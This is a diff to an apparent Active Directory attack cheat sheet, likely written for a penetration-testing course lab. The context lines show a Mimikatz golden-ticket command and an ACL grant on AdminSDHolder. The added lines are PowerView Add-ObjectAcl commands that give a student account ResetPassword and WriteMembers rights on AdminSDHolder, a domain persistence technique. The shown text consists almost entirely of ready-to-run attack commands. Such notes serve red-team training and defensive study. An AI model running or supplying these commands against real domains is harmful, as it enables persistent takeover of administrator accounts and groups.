@@ -489,4 +489,6 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 **Using ActiveDirectory Module of Set-ADACL**
 - `Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Principal studen1 -Verbose` 
 
-****
+**Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder**
+- `Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSAMAccountName student1 -Rights ResetPassword -Verbose`
+- `Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSAMAccountName student1 -Rights WriteMembers -Verbose`
